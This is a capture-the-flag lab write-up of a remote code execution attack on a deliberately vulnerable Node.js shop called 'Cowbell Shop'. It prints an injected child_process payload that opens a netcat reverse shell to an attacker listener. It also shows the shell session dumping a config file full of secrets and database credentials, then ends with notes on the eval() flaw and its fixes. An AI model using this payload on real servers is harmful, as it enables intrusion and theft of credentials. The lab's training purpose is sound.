# Cowbell Shop 5 - RCE

## Challenge

Remote Code Execution Attack: how clumsy code can lead to disasters

## Answer

### Explain the security problem 

* A remote code execution attack is one of the most dangerous. It can lead to full system access and take over of the system.

### Explain your attack. \(exploit, screenshot, hacking journal\) 

Step 1\) Start Web Shell Docker and listen on Port 1337

![](../../.gitbook/assets/image%20%28362%29.png)

```text
# IP
10.2.0.5

# PORT
1337
```

Step 2 -3 \)  Open the vuln. Cowbell Shop and navigate to Order page. Input in the form

```text
require('child_process').exec('nc 10.2.0.5 1337 -e sh -c "sh -i"')
```

and "Export PDF" \(which is not used in this challenge\)



Step 4\)  Check your netcat server for an incoming connection.

```bash
/app # cd configs
/app/configs # cat index.js
'use strict';

const flag = '3c7790ce-996f-4192-835b-619415f6bf7c';
const authSecret = '6a5d1f68as189c1asd31c98ad74f$ä¨ü123^01230dfasdklöfj asjfklö ä$das-füadfc$äsdä-$ad maklfjolu89ujpoadfädüafcnadszucfbhjk9m vkldf mlökl';
const fs = require('fs');
const sslKey = fs.readFileSync('encryption/key.pem');
const sslCert = fs.readFileSync( 'encryption/cert.pem' );

const config = {
    server: {
        host: '0.0.0.0',
        port: '80',
        sslPort: '443',
        SSRFPort: '8765'
    },
    sslOptions: {
        key: sslKey,
        cert: sslCert
    },
    crypt: {
        hash: 'sha256',
        secret: 'kslafjop2)/)*(ZOJKN*K*JL*IU%*IO%JH'
    },
    mongo: {
        username: 'webshopEditor',
        password: '1234',
        host: 'localhost',
        port: 27017,
        name: 'webshop',
        connectionString() {
            return 'mongodb://' + this.username + ':' + this.password + '@' + this.host + ':' + this.port + '/' + this.name;
        }
    },
    jwt: {
        secret: authSecret,
    },
    auth: {
        signOptions: {
            audience: 'self',
            issuer: 'webshop',
        },
        validateOptions: {
            secret: authSecret,
            audience: 'self',
            issuer: 'webshop'
        }
    },
    postImages: {
        directory: './assets/post-images/',
    },
    accountProfile: {
        directory: './public/app/assets/profiles/',
    }
};

module.exports = config;
/app #
```

Flag  = `3c7790ce-996f-4192-835b-619415f6bf7c`  


## Solution

#### Explain the underlying security problem

* Ability to trigger arbitrary code execution over a network.
* The CowbellShop is vuln. to Remote Code Execution 
* Attacker is able to run code with system level privileges on the CowbellShop server 
  * Access config files \(database, users\)

#### Explain the exploit

* The attackers user input 

  ```text
  require('child_process').exec('nc 10.2.0.5 1337 -e sh -c "sh -i"')
  ```



  is not sanitized and executed \(PDF generation\) on the victims server

* The victims server is not protected enough

#### Explain mitigation

* Secure programming:  User input validation and sanitation
* Patching of the server and used libraries
* Web Application Firewall \(ability to block such request based on patterns\)



## Lösung HL 

```text
eval() is evil

Do not use the eval() function. If you really need it then be sure you escaped and validated the input you enter in this function. Do not run the webserver as root or antoher user with much privileges and use other server hardening tactics. If someone is able to exploit this vulnerability, a non-root user process can not do as much harmful things as the root user.

Fixed Code in Backend Service:

Copied to clipboard
const querystring = require("querystring");
function getFromTo(from, range, callback) {
  let fromResult = querystring.escape(from);
  let toResult = eval(fromResult + " + " + querystring.escape(range));
  let result = { from: fromResult, to: toResult };
  return callback(
    null,
    ResponseUtil.createSuccessResponse(result, "Parameters accepted.")
  );
}
```

